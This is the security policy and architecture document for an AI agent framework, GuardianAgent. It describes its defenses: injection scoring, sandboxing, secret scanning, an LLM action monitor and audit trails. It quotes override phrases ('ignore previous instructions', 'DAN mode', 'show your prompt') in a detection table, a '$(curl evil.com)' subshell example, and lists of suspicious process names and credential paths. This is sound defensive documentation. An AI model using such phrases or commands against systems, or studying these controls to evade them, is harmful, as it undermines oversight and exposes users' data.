# Security Policy

## Supported Versions

| Version | Supported |
|---------|-----------|
| 1.x     | Yes       |
| < 1.0   | No        |

## Reporting a Vulnerability

If you find a security issue, please open a GitHub issue or reach out via the repository contact. Including steps to reproduce and potential impact helps us triage faster. Even better — fix it and submit a pull request.

---

# Security Architecture

GuardianAgent implements a security-focused runtime architecture with mandatory enforcement on framework-managed agent flows. Guardian, ToolExecutor, wrapped LLM access, approvals, brokered worker execution, and subprocess sandboxing are structural parts of the runtime, not optional conventions.

## Threat Model

GuardianAgent is an AI agent orchestration system where:

- **Supervisor-side framework code is trusted** — Runtime, orchestration, approvals, and tool execution run in the supervisor process
- **The built-in chat/planner loop is isolated from the supervisor** — it runs in a brokered worker and reaches tools and approvals through broker RPC
- **LLM output is NOT trusted** — Models can hallucinate, leak secrets, or be prompt-injected
- **User input is NOT trusted** — External input may contain injection attempts

### Threats Addressed

| Threat | Mitigation |
|--------|-----------|
| Prompt injection | InputSanitizer with 18 weighted signal patterns |
| Credential leakage via LLM | OutputGuardian + GuardedLLMProvider (mandatory wrapping) |
| Unauthorized file access | Allowed path roots + denied-path patterns + path normalization on managed file/tool actions |
| Capability escalation | Frozen per-agent capability grants + Guardian checks on framework-managed actions |
| DoS via message flooding | Multi-scope sliding windows: per-agent + per-user + global |
| Secret exfiltration via events | Payload scanning on all inter-agent communication |
| Event source spoofing | Trusted source validation + Runtime-stamped `ctx.emit()` source IDs |
| Shell command injection | POSIX tokenizer with whitelist validation |
| SSRF via tool HTTP requests | SsrfController blocks private IPs, loopback, cloud metadata, IPv4-mapped IPv6, and obfuscated IPs |
| LLM provider failures | CircuitBreaker + priority-based FailoverProvider |
| Malicious skill content | Local reviewed skill roots, no direct execution path, ToolExecutor/Guardian remain mandatory |
| Over-broad external tool providers | Guardian policy, managed provider allowlists, per-service capabilities, audit trail |
| Dangerous tool actions | Guardian Agent inline LLM evaluation blocks high/critical risk actions before execution |
| Host drift or suspicious local activity | Host monitor baselines processes, persistence, paths, and network; critical findings can block risky actions |
| Gateway firewall drift | Gateway monitor baselines firewall state, WAN policy, port forwards, and admin users; critical findings can block risky network actions |

---

## Four-Layer Defense System

GuardianAgent's security operates at every stage of the agent lifecycle through four independent defense layers.

```
┌─────────────────────────────────────────────────────────┐
│                    USER INPUT                           │
└───────────────────────┬─────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────┐
│  LAYER 1: Guardian Admission Pipeline (Proactive)       │
│                                                         │
│  ┌──────────────┐  ┌─────────────┐  ┌───────────────┐  │
│  │ InputSanitizer│→│ RateLimiter │→│ Capability    │  │
│  │ (mutating)   │  │ (validating)│  │ Controller    │  │
│  └──────────────┘  └─────────────┘  └───────────────┘  │
│         │                                    │          │
│         ▼                                    ▼          │
│  ┌──────────────┐  ┌─────────────┐  ┌───────────────┐  │
│  │ SecretScan   │→│ DeniedPath  │→│ ShellCommand  │  │
│  │ Controller   │  │ Controller  │  │ Controller    │  │
│  └──────────────┘  └─────────────┘  └───────────────┘  │
│         │                                               │
│         ▼                                               │
│  ┌──────────────┐                                       │
│  │ Ssrf         │                                       │
│  │ Controller   │                                       │
│  └──────────────┘                                       │
│                                                         │
│  Runs BEFORE agent.onMessage() — agent never sees       │
│  blocked input. Sync, rule-based, zero LLM calls.       │
└───────────────────────┬─────────────────────────────────┘
                        │ ✓ Allowed
                        ▼
┌─────────────────────────────────────────────────────────┐
│  AGENT EXECUTION                                        │
│                                                         │
│  The built-in chat/planner execution path runs in the   │
│  brokered worker process. The worker receives           │
│  supervisor-provided context and reaches                │
│  tools/approvals through broker RPC.                    │
│                                                         │
│  Supervisor-side framework code receives:               │
│  • ctx.llm = GuardedLLMProvider (NOT raw provider)      │
│  • ctx.emit() = scanned for secrets before dispatch     │
│  • ctx.capabilities = Object.freeze([...])              │
│  • ctx.checkAction() = Guardian policy check            │
│                                                         │
│  There is no default direct ctx.fs / ctx.http / ctx.exec│
│  surface. Runtime mediates framework-provided           │
│  interaction surfaces such as ctx.llm, ctx.emit(),      │
│  ctx.dispatch(), and managed tools.                     │
└───────────────────────┬─────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────┐
│  LAYER 1.5: OS-Level Process Sandbox                    │
│                                                         │
│  Linux uses bwrap namespace isolation when available.    │
│  Sandbox health states control strict-mode availability  │
│  for risky subprocess-backed tools.                      │
│  The default enforcement mode is strict.                 │
│  Fallback behavior uses ulimit + env hardening.          │
│  Windows and macOS support depend on platform helpers.   │
│                                                         │
│  ┌──────────────┐  ┌─────────────┐  ┌───────────────┐  │
│  │ Filesystem   │  │ Network     │  │ Resource      │  │
│  │ Isolation    │  │ Namespace   │  │ Limits        │  │
│  │ (ro-bind)    │  │ (unshare)   │  │ (ulimit)      │  │
│  └──────────────┘  └─────────────┘  └───────────────┘  │
│                                                         │
│  Child processes run with namespace/resource isolation.  │
│  Write access is constrained by sandbox binds, network   │
│  is isolated by default, and resource quotas are         │
│  enforced when supported by platform capabilities.       │
└───────────────────────┬─────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────┐
│  LAYER 2: Guardian Agent (Inline LLM Evaluation)        │
│                                                         │
│  The namesake feature. Evaluates tool actions via LLM   │
│  BEFORE execution. Can deny risky or malicious actions.  │
│                                                         │
│  • Runs on non-read-only tool actions (mutating,        │
│    network, external_post)                              │
│  • Uses dedicated security prompt — no SOUL/skills      │
│  • Configurable LLM: local (Ollama), external           │
│    (OpenAI/Anthropic), or auto (local-first fallback)   │
│  • Fail-closed by default (action blocked if LLM is     │
│    unavailable or times out; configurable: failOpen)    │
│  • All evaluations logged to audit trail with           │
│    controller='GuardianAgent'                           │
│  • Risk levels: safe, low, medium (allow), high,        │
│    critical (block)                                     │
└───────────────────────┬─────────────────────────────────┘
                        │ ✓ Allowed
                        ▼
┌─────────────────────────────────────────────────────────┐
│  LAYER 3: Output Guardian (Reactive)                    │
│                                                         │
│  Scans agent response AFTER execution, BEFORE delivery  │
│                                                         │
│  • 30+ secret patterns (AWS, GCP, Azure, GitHub, etc.)  │
│  • Redact mode: replace secrets with [REDACTED]         │
│  • Block mode: return "[Response blocked]" entirely     │
│  • Event payloads also scanned before inter-agent send  │
│                                                         │
│  GuardedLLMProvider ensures EVERY ctx.llm call is       │
│  scanned before delivery                                │
└───────────────────────┬─────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────┐
│  LAYER 4: Sentinel Audit (Retrospective)                │
│                                                         │
│  Runs on cron schedule (default 5m) or on-demand via    │
│  web UI / API. Analyzes AuditLog for patterns:          │
│                                                         │
│  • Volume spikes (denial rate > 3x baseline)            │
│  • Capability probing (agent denied for 5+ actions)     │
│  • Repeated secret detection (3+ per agent)             │
│  • Error storms (>10 errors in window)                  │
│  • Optional LLM-enhanced analysis                       │
│  • Network baseline anomalies + traffic threat signals  │
│                                                         │
│  Available via POST /api/sentinel/audit and in the      │
│  web UI Settings > Sentinel Audit panel.                │
└─────────────────────────────────────────────────────────┘
```

---

## Framework Enforcement Points

The following controls are enforced at Runtime chokepoints for the built-in brokered chat path plus supervisor-managed `ctx.emit()`, `ctx.dispatch()`, and managed tool execution.

| Chokepoint | Enforcement | Bypass Prevention |
|------------|-------------|-------------------|
| **Message input** | Guardian pipeline runs BEFORE `agent.onMessage()` | Agent never sees blocked messages |
| **Chat agent execution** | Built-in chat/planner loop runs in a brokered worker by default | The worker has no direct `Runtime` or `ToolExecutor` reference |
| **Tool pre-execution** | Guardian Agent LLM evaluates action before tool handler runs | Risky actions blocked before any side effects |
| **Host self-policing** | Host monitor can block risky command/network actions when critical or stacked high-severity host alerts are active | High-risk follow-up actions require operator review after suspicious host activity |
| **Response output** | OutputGuardian scans after execution | Response modified before delivery |
| **LLM access** | `GuardedLLMProvider` wraps real provider for `ctx.llm` | Framework-managed LLM calls are scanned/redacted before delivery |
| **Event emission** | Runtime source validation + payload scanning before dispatch | `ctx.emit()` stamps source; untrusted source IDs rejected |
| **Process sandbox** | bwrap namespace / Windows helper / ulimit for managed child processes | Wrapped at exec/spawn call site |
| **Resource limits** | Budget/token/queue checks before invocation | Runtime rejects over-limit requests |
| **Lifecycle gating** | Dead/Errored/Stalled agents cannot receive work | `assertExecutable()` guard |
| **Context immutability** | `Object.freeze()` on agent contexts | Agents cannot modify capabilities |

---

## Brokered Agent Isolation

The built-in chat/planner execution path runs in a separate brokered worker process by default. The supervisor process owns config loading, admission, audit logging, tool execution, approvals, and orchestration. Structured orchestration agents execute in the supervisor process and dispatch built-in chat-agent work through the brokered path.

- The worker has no network access — LLM API calls are proxied through the broker RPC (`llm.chat`)
- Tool execution and approvals are mediated through broker RPC — the worker has no direct `Runtime` or `ToolExecutor` reference
- On strong hosts the worker uses the `agent-worker` sandbox profile with full namespace isolation
- On degraded hosts the worker uses the `workspace-write` profile with a hardened environment

There is no `ctx.fs`, `ctx.http`, or `ctx.exec`. Framework-managed interaction points are `ctx.llm` (guarded), `ctx.emit()` (scanned), `ctx.dispatch()` (Guardian-checked per call), managed tools, and returning a response (scanned).

---

## Input Security

### Prompt Injection Defense

The InputSanitizer operates as a mutating admission controller with two defenses:

#### 1. Invisible Character Stripping

Removes Unicode characters that can hide instructions:
- Zero-width joiners/spaces (U+200B–200F)
- Bidi markers (U+202A–202E)
- Word joiners, isolate markers (U+2060–2069)
- BOM (U+FEFF), soft hyphens (U+00AD)

#### 2. Injection Signal Detection (18 patterns)

| Category | Examples | Score |
|----------|----------|-------|
| Role override | "ignore previous instructions", "you are now" | 2–3 |
| Delimiter injection | `system:`, `assistant:`, code fence system | 1–3 |
| Instruction override | "new instructions:", "override all settings" | 3 |
| Jailbreak | "DAN mode", "developer mode" | 2–3 |
| Data exfiltration | "repeat all above", "show your prompt" | 2 |

Scores are additive. Default block threshold: **3** (configurable).

Detection is run against both raw and normalized text. Normalization includes NFKC Unicode normalization, leetspeak canonicalization (`1`→`i`, `0`→`o`, etc.), and separator de-obfuscation (for cases like `ig-nore previous instructions`).

### SSRF Protection

The SsrfController blocks outbound tool URLs targeting:
- Private IPs (RFC1918), loopback, link-local
- Cloud metadata endpoints (169.254.169.254, metadata.google.internal)
- IPv4-mapped IPv6 addresses
- Decimal/hex/octal IP obfuscation

### Per-Agent Capability Model

Capabilities are granted per-agent at registration and **frozen** (`Object.freeze`). Framework-managed actions must pass Guardian checks using those grants.

| Capability | Grants Access To |
|-----------|-----------------|
| `read_files` | File read operations |
| `write_files` | File write/create operations |
| `execute_commands` | Shell command execution |
| `network_access` | HTTP requests to allowed domains |
| `read_email` / `draft_email` / `send_email` | Email inbox, composition, and sending |
| `read_calendar` / `write_calendar` | Calendar access and modification |
| `read_drive` / `write_drive` | Google Drive access and modification |
| `read_docs` / `write_docs` | Google Docs access and modification |
| `read_sheets` / `write_sheets` | Google Sheets access and modification |
| `git_operations` | Git commands |
| `install_packages` | Package installation |

#### Trust Presets

| Preset | Capabilities | Rate Limit | Budget | Tool Policy |
|--------|-------------|------------|--------|-------------|
| **locked** | read_files only | 10/min, 100/hr | 15s | approve_each |
| **safe** | read_files, read_email | 20/min, 300/hr | 30s | approve_by_policy |
| **balanced** | read/write/exec/git/email | 30/min, 500/hr | 60s | approve_by_policy |
| **power** | all capabilities | 60/min, 2000/hr | 300s | autonomous |

---

## Tool Execution Security

### Approval Policy

| Mode | Behavior |
|------|----------|
| `approve_each` | Every tool call requires explicit user approval |
| `approve_by_policy` | Per-tool overrides: `auto`, `policy`, `manual`, `deny`; read-only and network tools allowed by default |
| `autonomous` | Tools execute without approval (still sandboxed) |

### Risk Classification

| Risk Level | Examples |
|-----------|---------|
| `read_only` | File reads, searches |
| `mutating` | File writes, deletes |
| `network` | HTTP requests, downloads |
| `external_post` | Sending emails, posting to forums |

### Shell Command Validation

The ShellCommandController goes beyond simple string matching:

1. **POSIX tokenizer** handles quoting (`echo "hello && world"` → one command)
2. **Chain splitting** on `&&`, `||`, `;`, `|` operators
3. **Each sub-command** validated against whitelist
4. **Redirect targets** (`> .env`) checked against denied paths
5. **Subshell detection** (`$(curl evil.com)`) → denied
6. **Deny by default** if parser can't fully understand the input

### Sandbox Restrictions

- **Path whitelist**: Tools can only access configured filesystem roots
- **Command whitelist**: Shell execution limited to explicitly allowed commands
- **Domain whitelist**: Network requests limited to configured domains
- **Provider host checks**: `web_search` verifies required provider hosts are allowlisted before making requests
- **Dry-run mode**: Preview mutating operations without execution

### Policy-as-Code Engine

Declarative JSON rule files replace hard-coded approval logic with an auditable, version-controlled policy engine.

**Architecture:**
- **Rule files** in `policies/` are loaded at startup and compiled into priority-sorted matcher closures
- **Canonical PolicyInput** model: `{ family, principal, action, resource, context }` — resource is always the tool; targets go in `resource.attrs`
- **Deterministic evaluation**: first-match wins, with family defaults as fallback
- **10 match primitives**: exact, `in`/`notIn`, `gt`/`gte`/`lt`/`lte`, `startsWith`/`endsWith`, `regex`, `exists`
- **Compound conditions**: `allOf` (implicit default) and `anyOf` for disjunctive logic

**Operating modes:**

| Mode | Behavior |
|------|----------|
| `off` | Engine disabled, legacy `decide()` only |
| `shadow` | Engine runs alongside legacy; mismatches logged but legacy decision used (default) |
| `enforce` | Engine's decision is authoritative; legacy path disabled |

**Shadow mode safety:**
- Mismatches classified as `policy_too_strict`, `policy_too_permissive`, `normalization_bug`, or `legacy_bug`
- Log throttling after configurable limit (default 1000)
- Match rate and mismatch-by-class stats available via API
- 14-day exit criteria: 99%+ match rate, zero `policy_too_permissive` mismatches

**Schema versioning:** Files include `schemaVersion` field; engine rejects files with a newer version than supported, preventing accidental deployment of incompatible rules.

**Fail-safe behavior:**
- Shadow mode: engine error → log + continue with legacy decision
- Enforce mode: engine error → fail closed (deny)

See [`docs/specs/POLICY-AS-CODE-SPEC.md`](docs/specs/POLICY-AS-CODE-SPEC.md) for the full specification.

---

## Process Sandbox

Managed child processes spawned by tool execution are wrapped in OS-level isolation using [bubblewrap (bwrap)](https://github.com/containers/bubblewrap) on Linux, an optional native helper on Windows, and graceful fallback to `ulimit` + environment hardening when stronger backends are unavailable.

The brokered chat worker is also launched through the managed sandbox layer with `networkAccess: false`. LLM API calls are proxied through the broker RPC (`llm.chat`), so the worker process never makes outbound network connections.

### Sandbox Profiles

| Profile | Filesystem | Network | Use Case |
|---------|-----------|---------|----------|
| `read-only` | Root bind (read-only), `/tmp` writable | Isolated by default | System info, document search, network probes |
| `workspace-write` | Workspace writable, `.git`/`.env*` forced read-only | Isolated by default | `execute_command`, MCP servers, browser |
| `agent-worker` | Dedicated worker workspace, remapped `HOME`/`TMPDIR` | Network-disabled (LLM proxied via broker) | Brokered chat/planner worker (strong hosts) |
| `full-access` | No isolation (env hardening only) | Full access | Explicitly trusted operations |

### Isolation Mechanisms

| Mechanism | Platform | What It Does |
|-----------|----------|-------------|
| **bwrap namespace** | Linux | PID/network namespace isolation, read-only root bind, protected paths |
| **ulimit** | POSIX | Memory (512MB), CPU (60s), file size (10MB) limits; optional process count |
| **Env hardening** | All | Strips loader/interpreter injection vars (`LD_PRELOAD`, `DYLD_*`, `NODE_OPTIONS`, `GIT_SSH_COMMAND`, `PYTHONPATH`, `RUBYLIB`, `PERL5LIB`, etc.) |
| **Symlink resolution** | All | `resolveAllowedPath` resolves symlinks via `fs.realpath()` before path checking |

### Sandbox Availability Model

GuardianAgent classifies sandbox strength as `strong`, `degraded`, or `unavailable` and threads that state into tool registration, execution, and user-facing status surfaces.

- Linux with `bwrap` available → `strong`
- Linux without `bwrap` → degrades to `ulimit` or env hardening
- macOS → currently reports `degraded`
- Windows → reports `strong` only when a configured native helper is enabled and detected; otherwise `unavailable`

In `strict` mode, risky subprocess-backed tools are disabled unless sandbox availability is `strong`. In `permissive` mode, they remain available with degraded isolation.

**Risky tool classes blocked in `strict` mode:** shell execution, browser automation, MCP server processes, subprocess-backed search/indexing, and broad host-access categories (`network`, `system`).

Install bwrap on Debian/Ubuntu: `sudo apt install bubblewrap`

### Windows Sandbox Backend

- AppContainer-backed process launch for sandboxed profiles (`read-only`, `workspace-write`)
- Job Object `KILL_ON_JOB_CLOSE` enforcement for child process trees
- Strict-mode fail-closed behavior when the helper is missing/unhealthy
- Optional portable zip bundle ships the sandbox helper alongside the runtime

See `docs/proposals/WINDOWS-PORTABLE-ISOLATION-OPTION.md` for packaging details.

### Configuration

```yaml
assistant:
  tools:
    sandbox:
      enabled: true
      enforcementMode: strict          # strict | permissive
      mode: workspace-write            # Default profile
      networkAccess: false             # Default: isolate network
      additionalWritePaths: []         # Extra writable paths
      additionalReadPaths: []          # Extra read-only paths
      resourceLimits:
        maxMemoryMb: 512
        maxCpuSeconds: 60
        maxFileSizeKb: 10240           # 10 MB
        maxProcesses: 0                # 0 = unlimited; bwrap PID namespace used instead
      windowsHelper:                   # Windows only
        enabled: true
        command: ./bin/guardian-sandbox-win.exe
        timeoutMs: 5000
```

### Unified Operator Controls

Three simplified top-level config aliases provide a clean mental model that maps to the internal config sections:

```yaml
sandbox_mode: strict           # off | workspace-write | strict
approval_policy: auto-approve  # on-request | auto-approve | autonomous
writable_roots:                # merged into allowedPaths + sandbox additionalWritePaths
  - /home/user/projects
```

| Alias | Internal Mapping |
|-------|-----------------|
| `sandbox_mode: off` | `runtime.agentIsolation.enabled: false`, sandbox disabled |
| `sandbox_mode: workspace-write` | Brokered worker with workspace-write profile |
| `sandbox_mode: strict` | Brokered worker with strict enforcement mode |
| `approval_policy: on-request` | `assistant.tools.policyMode: approve_each` |
| `approval_policy: auto-approve` | `assistant.tools.policyMode: approve_by_policy` |
| `approval_policy: autonomous` | `assistant.tools.policyMode: autonomous` |
| `writable_roots` | Merged into `allowedPaths` and `sandbox.additionalWritePaths` |

These are convenience aliases. Internal config sections take precedence when set alongside the aliases.

---

## Secret Detection & Output Security

### Secret Detection Patterns (30+)

Secret scanning is applied to **all string fields** in action params (recursive traversal), not just `content`.

| Category | Patterns Detected |
|----------|------------------|
| **AWS** | Access Key (`AKIA...`), Secret Key, Session Token |
| **GCP / Google** | Service Account JSON, AI API Key (`AIza...`) |
| **Azure** | Storage Account Key (connection string) |
| **GitHub** | PAT (`ghp_`), OAuth (`gho_`), App Token (`ghs_`, `ghr_`) |
| **GitLab** | PAT (`glpat-`), Pipeline Token (`glptt-`) |
| **OpenAI** | API Key (`sk-proj-`, `sk-...`) |
| **Anthropic** | API Key (`sk-ant-...`) |
| **Stripe** | Live Key (`sk_live_`), Test Key (`sk_test_`) |
| **Slack** | Bot Token (`xoxb-`), Webhook URL |
| **Twilio** | API Key (`SK` + 32 hex) |
| **SendGrid** | API Key (`SG.<22>.<43>`) |
| **Telegram** | Bot Token |
| **npm** | Token (`npm_`) |
| **Infrastructure** | Heroku API Key, Mailgun Key |
| **Tokens/Certs** | JWT (`eyJ...`), PEM Private Key headers, Connection Strings |
| **PII** | Email addresses, US SSN, Credit Card numbers, US Phone numbers |
| **Generic** | `password=`, `api_key=`, `secret=`, `token=` patterns |

### PII Field-Level Exemptions

Email addresses are PII and flagged by default. However, email/calendar/MCP tool actions require email addresses in addressing fields. The `SecretScanController` applies a **narrow, field-scoped exemption**:

- **Only** the `Email Address` pattern is exempted
- **Only** in structurally required addressing fields: `to`, `from`, `cc`, `bcc`, `sender`, `recipient`, `recipients`, `attendees`, `organizer`, `replyTo`, `reply_to`
- **Only** for action types where addressing is expected: `send_email`, `draft_email`, `read_email`, `read_calendar`, `write_calendar`, `mcp_tool`
- Email addresses in **any other field** (e.g. `body`, `description`, `notes`, `content`) are **still flagged**
- All other PII patterns (SSN, credit cards, phone numbers) are **never** exempted
- All credential patterns are **never** exempted regardless of field or action type

### Denied File Paths (15 patterns)

`.env`, `*.pem`, `*.key`, `credentials.*`, `id_rsa*`, SSH keys, `*.p12`/`*.pfx`, `*.jks`, `.npmrc`, `*.tfvars`, `*.tfstate`, `docker-compose*.yml`, `.aws/credentials`, `.docker/config.json`, `kubeconfig`

### Output Guardian

- GuardedLLMProvider scans every LLM response for secrets automatically
- Response redaction replaces detected credentials with `[REDACTED]`
- Inter-agent event payloads are scanned before dispatch
- Tool results are wrapped as structured `<tool_result ...>` envelopes before they return to the model
- Tool-result strings are stripped of invisible Unicode, checked for prompt-injection signals, and PII-redacted before reinjection
- All detections logged to the audit trail

---

## Monitoring & Audit

### Tamper-Evident Audit Trail

Every security event is persisted to `~/.guardianagent/audit/audit.jsonl` with SHA-256 hash chaining:

```
{ event: {...}, previousHash: "abc123...", hash: "def456..." }
```

Each entry's hash is computed over the event + previous hash, creating a **tamper-evident chain**. Any modification to historical entries breaks the chain.

Chain verification is available via `GET /api/audit/verify`:

```typescript
const result = await auditLog.verifyChain();
// { valid: true, totalEntries: 1523 }
```

#### Event Types (13)

| Event | Severity | Description |
|-------|----------|-------------|
| `action_denied` | warn | Guardian blocked an action |
| `action_allowed` | info | Action passed Guardian check |
| `secret_detected` | warn/critical | Secret found in content |
| `output_blocked` | warn | LLM response blocked entirely |
| `output_redacted` | warn | Secrets redacted from response |
| `event_blocked` | warn | Inter-agent event blocked |
| `input_sanitized` | info | Invisible chars stripped |
| `rate_limited` | warn | Rate limit triggered |
| `capability_probe` | warn | Agent probed beyond capabilities |
| `policy_changed` | info | Tool or Guardian policy modified |
| `anomaly_detected` | warn/critical | Sentinel detected anomaly |
| `agent_error` | warn | Agent execution error |
| `agent_stalled` | warn | Agent stall detected |

### Host Workstation Monitoring

A practical host-monitoring layer intended for direct host installs where there is no Docker or VM boundary. Windows-first in threat model and process naming, with portable coverage for Linux and macOS.

**Signals:**
- **Suspicious process detection** — Windows: `wscript.exe`, `mshta.exe`, `rundll32.exe`, `regsvr32.exe`, `bitsadmin.exe`, `certutil.exe`; portable: `osascript`, `launchctl`, `socat`, `nc`
- **Persistence drift** — Windows Run/RunOnce keys, scheduled tasks, Startup folders; Linux autostart, systemd, crontab; macOS LaunchAgents/Daemons
- **Sensitive path drift** — GuardianAgent state, SSH, cloud credentials, kube config, shell/PowerShell profiles
- **Network drift** — new external destinations, new listening ports (high-risk ports elevated)
- **Firewall posture** — Windows Defender Firewall, Linux ufw/nftables/iptables, macOS pf

**Self-policing behavior:**
- Critical host alerts can block risky follow-up actions (command execution, outbound/network actions)
- Multiple active high-severity alerts can force operator review before sensitive execution continues
- Denials are logged as `action_denied` with `controller: HostMonitor`

**Operator surfaces:** audit events (`host_alert`), configurable notification fanout, Security page (posture cards, active alerts, manual check, acknowledgement), built-in automation starters.

**Limits:** This is a practical first-pass monitor, not EDR-grade telemetry. File drift is metadata-based. Deep process correlation and auditd/eBPF/EndpointSecurity telemetry are future work.

### Gateway Firewall Monitoring

Monitors edge devices (OPNsense, pfSense, UniFi-class gateways) as a separate subsystem from host monitoring.

- Configuration path: `assistant.gatewayMonitoring`
- Collector mode: operator-configured command returning normalized JSON
- Baselines: firewall state, WAN default action, rule count, port forwards, admin users, firmware version
- Detects: firewall disablement/relaxation, configuration drift, port-forward changes, admin-user changes
- Critical gateway alerts can block sensitive follow-up actions
- Alert family: `gateway_alert`

Gateway monitoring is intentionally separate from local host monitoring — host monitoring observes the machine GuardianAgent runs on, while gateway monitoring observes remote perimeter devices through operator-supplied collectors.

---

## Credential Handling

- Runtime credential references via `assistant.credentials.refs` — env-backed `credentialRef` is the preferred pattern over inline `apiKey` fields
- Approval records store redacted arguments and a deterministic hash (`argsHash`) rather than raw sensitive values
- Credential values are resolved inside the main runtime process when creating provider/tool clients
- Output scanning and denied-path controls reduce accidental exfiltration
- Provider-managed secure storage (e.g., OS keyring) is preferred for external integrations

Example:

```yaml
assistant:
  credentials:
    refs:
      llm.openai.primary:
        source: env
        env: OPENAI_API_KEY
      search.brave.primary:
        source: env
        env: BRAVE_API_KEY

llm:
  openai:
    provider: openai
    model: gpt-4o
    credentialRef: llm.openai.primary
```

**Limit:** This is a credential reference and resolution layer, not yet a separate secret-broker process. Credentials are better isolated at config level, but not yet held outside the runtime boundary at execution time.

---

## Web Channel Security

| Feature | Implementation |
|---------|---------------|
| **Authentication** | Bearer token (required by default) |
| **Token rotation** | Optional auto-rotation on startup |
| **CORS** | Configurable allowed origins |
| **Request limits** | Configurable max body size (default 1MB) |
| **Auth modes** | `bearer_required` (only supported mode; other values forced to `bearer_required`) |
| **SSE** | Authenticated via session cookie or `Authorization` header (`?token=` is rejected) |

### Browser-to-Localhost Mitigations

GuardianAgent is hardened against the class of attacks where a malicious website attempts to drive a locally running agent over loopback HTTP/WebSocket interfaces.

- No WebSocket control plane — authenticated HTTP APIs plus authenticated SSE only
- Localhost/loopback is **not** treated as trusted for API access; `/api/*` and `/sse` always require authentication
- When no web token is configured, a secure random token is generated for the active run
- Wildcard CORS (`'*'`) is rejected by configuration validation
- Browser session cookies are `HttpOnly` and `SameSite=Strict`
- Repeated authentication failures are rate-limited and temporarily blocked
- Privileged state-changing operations require short-lived privileged tickets in addition to base authentication
- SSE does not accept query-string tokens

**Residual risk:** Broad `allowedOrigins` settings weaken the browser boundary. Binding to non-loopback interfaces increases remote attack surface. Valid bearer tokens still grant full API access within the authorization model.

---

## Integration Security

### Native Skills

Skills are a **knowledge and workflow layer**, not a privileged execution layer.

- Loaded from configured local roots by default
- Skills do not create or bypass tools, and do not grant capabilities
- Skills may recommend actions, but execution goes through ToolExecutor and Guardian
- Any future install/setup steps must be explicitly approval-gated

### Google Workspace

Integration with Gmail, Calendar, Drive, Docs, and Sheets via managed MCP server (`@googleworkspace/cli`).

- The GWS CLI is **not bundled** — installed separately by the user
- OAuth 2.0 requires an interactive browser flow (`gws auth login`) — cannot be initiated headlessly
- Credentials stored in the OS keyring by `gws`, not by GuardianAgent
- Only configured Google services are exposed (opt-in via `services` array)
- External send/post actions (e.g. `gmail_send`) remain approval-gated
- Email addresses exempted only in addressing fields for email/calendar tools (see PII Exemptions above)

### MCP Tool Servers

- Tool names namespaced (`mcp-<serverId>-<toolName>`) to prevent collisions
- All MCP tool calls pass through Guardian admission
- Risk inferred from MCP metadata (`read_only`, `mutating`, `external_post`)
- Optional per-server `trustLevel` and `maxCallsPerMinute` overrides

### Orchestration Security

Multi-agent orchestration (Sequential, Parallel, Loop, Conditional agents) maintains security invariants:

- All sub-agent invocations go through `Runtime.dispatchMessage()`
- Each sub-agent call passes through the full Guardian admission pipeline
- Shared state between agents is scoped and cleaned between runs
- Orchestration agents receive `ctx.dispatch()` — a guarded wrapper, not raw runtime access

---

## Resource Governance

### Per-Agent Limits

| Resource | Default | Purpose |
|----------|---------|---------|
| `maxInvocationBudgetMs` | 300,000ms (5min) | Wall-clock timeout per invocation |
| `maxTokensPerMinute` | 0 (unlimited) | LLM token rate limiting |
| `maxConcurrentTools` | 0 (unlimited) | Parallel tool execution cap |
| `maxQueueDepth` | 1,000 | Event queue backpressure |

### Stall Detection & Recovery

- **Watchdog** monitors agent activity timestamps
- Stall threshold: configurable (default 180s)
- Error recovery: exponential backoff [30s, 1m, 5m, 15m, 60m]
- After the backoff schedule saturates, retries continue at max backoff (agent remains recoverable)

### LLM Resilience

- **CircuitBreaker**: Per-provider failure tracking (closed → open → half-open)
- **FailoverProvider**: Priority-based provider chain with automatic fallback
- Token usage tracked per-agent for rate limiting

---

## Design Principles

### Meta's Rule of Two

An agent should satisfy **at most two** of:
1. Processing untrusted inputs (user content, web pages)
2. Accessing sensitive data (credentials, .env files)
3. Changing state / communicating externally (shell commands, API calls)

### Security by Construction vs Convention

| Approach | GuardianAgent | Typical Frameworks |
|----------|--------------|-------------------|
| Output scanning | **Mandatory** (GuardedLLMProvider) | Optional callback |
| Capability enforcement | **Frozen grants** (Object.freeze) | Runtime checks |
| Admission pipeline | **Inline in Runtime** | Plugin/middleware |
| Audit logging | **Automatic** for all security events | Manual instrumentation |
| Context isolation | **Brokered worker + frozen context** on framework surfaces | Documentation only |

### Core Hardening Summary

- Mandatory runtime chokepoints: every message, LLM call, response, and event is mediated by Runtime enforcement
- Least-privilege capability model with immutable frozen context
- Prompt-injection resistance: invisible Unicode stripping plus weighted injection signal scoring
- Tool governance and sandboxing: approval workflows, per-tool policy overrides, risk-tiered classes
- Connector + playbook guardrails: host/path/command/capability allowlists, bounded step execution, signed/dry-run controls
- Secret exfiltration controls: multi-pattern scanning, response redaction/blocking, inter-agent payload blocking
- Intent hardening via SOUL profile: configurable injection with primary/delegated modes
- Cryptographic correlation: deterministic SHA-256 hashes of redacted tool args for traceability
- Web auth hardening: constant-time bearer comparison plus short-lived signed privileged tickets
- Tamper-evident policy-change trail: SHA-256 config snapshots recorded as `policy_changed` audit events
- SQLite integrity hardening: periodic `PRAGMA quick_check`, secure permissions, and hashed integrity checkpoints

---

## Configuration Reference

All security features are configurable in `~/.guardianagent/config.yaml`:

```yaml
guardian:
  enabled: true
  logDenials: true
  trustPreset: balanced          # locked | safe | balanced | power

  inputSanitization:
    enabled: true
    blockThreshold: 3

  rateLimit:
    maxPerMinute: 30
    maxPerHour: 500
    burstAllowed: 5
    maxPerMinutePerUser: 30
    maxPerHourPerUser: 500
    maxGlobalPerMinute: 300
    maxGlobalPerHour: 5000

  outputScanning:
    enabled: true
    redactSecrets: true          # false = block entire response

  guardianAgent:
    enabled: true
    llmProvider: auto             # local | external | auto
    failOpen: false               # block actions when LLM unavailable (fail-closed)
    timeoutMs: 8000               # inline evaluation timeout

  sentinel:
    enabled: true
    schedule: '*/5 * * * *'

  auditLog:
    maxEvents: 10000
    persistenceEnabled: true
```

---

## Extensibility

### Custom Admission Controllers

```typescript
guardian.use({
  name: 'MyController',
  phase: 'validating',
  check: (action) => {
    if (action.params.blocked) {
      return { allowed: false, reason: 'Custom denial', controller: 'MyController' };
    }
    return null; // pass through
  },
});
```

### Custom Secret Patterns

```yaml
guardian:
  additionalSecretPatterns:
    - 'MYTOKEN_[A-Za-z0-9]{32}'
```

